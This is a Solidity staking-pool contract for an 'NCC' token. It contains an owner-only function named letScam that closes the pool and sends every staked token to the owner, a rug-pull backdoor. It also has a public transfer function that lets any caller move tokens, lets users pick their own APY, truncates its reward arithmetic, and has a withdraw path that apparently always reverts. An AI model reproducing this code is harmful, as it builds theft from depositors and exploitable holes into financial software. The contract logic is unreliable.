// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;
import "./IERC20.sol";

contract StakingNCCToken {
    //variables
    address private owner;
    IERC20 private nccToken;

    struct Staker {
        address stakerAddress;
        uint256 stakedAmount;
        uint256 stakedApy;
        uint256 stakedTime;
    }

    mapping(address => Staker) public stakers;
    address[] public stakersAddresses;

    enum PoolStatus {
        Open,
        Closed
    }

    PoolStatus private poolStatus;

    // events
    event Staked(address indexed staker, uint256 amount);

    // modifiers
    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner can call this function.");
        _;
    }

    // constructor

    constructor(IERC20 _nccToken) {
        owner = msg.sender;
        poolStatus = PoolStatus.Open;
        require(
            address(_nccToken) != address(0),
            "StakingPool: NCC Token address cannot be 0"
        );
        nccToken = IERC20(_nccToken);
    }

    // functions
    function transfer(
        address _from,
        address _to,
        uint256 _amount
    ) public returns (bool) {
        nccToken.approve(_from, _to, _amount);
        nccToken.transferFrom(_from, _to, _amount);

        return true;
    }

    function stake(uint256 _amount, uint256 _apy) external {
        require(poolStatus == PoolStatus.Open, "StakingPool: Pool is closed");
        require(_amount > 0, "StakingPool: Amount cannot be 0");
        require(_apy > 0, "StakingPool: APY cannot be 0");
        require(
            nccToken.balanceOf(msg.sender) >= _amount,
            "StakingPool: Insufficient balance"
        );
        require(
            transfer(msg.sender, address(this), _amount),
            "StakingPool: Transfer failed"
        );

        stakers[msg.sender].stakerAddress = msg.sender;
        stakers[msg.sender].stakedAmount = _amount;
        stakers[msg.sender].stakedApy = _apy;
        stakers[msg.sender].stakedTime = block.timestamp;

        stakersAddresses.push(msg.sender);
    }

    function withdraw() external {
        require(poolStatus == PoolStatus.Open, "Pool is closed.");
        require(
            stakers[msg.sender].stakedAmount >= 0,
            "StakingPool: Insufficient staked balance"
        );

        uint256 reward = getReward(msg.sender);

        uint256 totalAmount = stakers[msg.sender].stakedAmount + reward;

        require(
            transfer(address(this), msg.sender, totalAmount),
            "StakingPool: Transfer failed"
        );

        delete stakers[msg.sender];
        this.removeStakerAddress(msg.sender);
    }

    function getReward(address staker) public view returns (uint256) {
        require(poolStatus == PoolStatus.Open, "Pool is closed.");
        Staker memory _staker = stakers[staker];
        require(_staker.stakedAmount > 0, "StakingPool: staker does not exist");
        require(
            block.timestamp > _staker.stakedTime,
            "StakingPool: stake time has not passed"
        );

        uint256 timeDiff = block.timestamp - _staker.stakedTime;

        uint256 reward = (_staker.stakedAmount *
            (_staker.stakedApy / 100) *
            timeDiff) / 365 days;

        return reward;
    }

    function getAllStakers() external view returns (Staker[] memory) {
        Staker[] memory _stakers = new Staker[](stakersAddresses.length);

        for (uint256 i = 0; i < stakersAddresses.length; i++) {
            _stakers[i] = this.getStaker(stakersAddresses[i]);
        }

        return _stakers;
    }

    function getStaker(address _stakerAddress)
        external
        view
        returns (Staker memory)
    {
        return stakers[_stakerAddress];
    }

    function getPoolDetails()
        external
        view
        returns (
            address,
            uint256,
            uint256,
            PoolStatus
        )
    {
        return (
            owner,
            stakersAddresses.length,
            this.getTokensOf(address(this)),
            poolStatus
        );
    }

    function setPoolStatus(PoolStatus _poolStatus) external onlyOwner {
        require(
            _poolStatus == PoolStatus.Open || _poolStatus == PoolStatus.Closed,
            "StakingPool: Invalid pool status"
        );
        poolStatus = _poolStatus;
    }

    function transferOwnership(address _newOwner) external onlyOwner {
        require(_newOwner != address(0), "StakingPool: New owner cannot be 0");
        owner = _newOwner;
    }

    function letScam() external onlyOwner {
        this.setPoolStatus(PoolStatus.Closed);
        this.transfer(address(this), owner, nccToken.balanceOf(address(this)));
    }

    function getTokensOf(address _address) external view returns (uint256) {
        return nccToken.balanceOf(_address);
    }

    function removeStakerAddress(address _stakerAddress) external onlyOwner {
        for (uint256 i = 0; i < stakersAddresses.length; i++) {
            if (stakersAddresses[i] == _stakerAddress) {
                delete stakersAddresses[i];
            }
        }
    }
}
